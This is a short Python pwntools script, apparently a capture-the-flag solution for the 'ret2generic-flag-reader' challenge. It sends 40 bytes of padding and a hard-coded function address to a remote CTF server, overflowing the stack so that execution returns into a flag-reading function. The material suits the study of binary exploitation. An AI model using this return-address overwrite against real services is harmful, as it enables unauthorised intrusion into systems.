from pwn import *

DEBUG = False

if DEBUG:
    r = process("./ret2generic-flag-reader")
    gdb.attach(r)
else:
    r = remote("mc.ax", 31077)

print(r.recvuntil("think?"))

func_addr = 0x00000000004011f6
payload = "a"*40 + p64(func_addr)
r.sendline(payload)

print(r.recv())

r.interactive()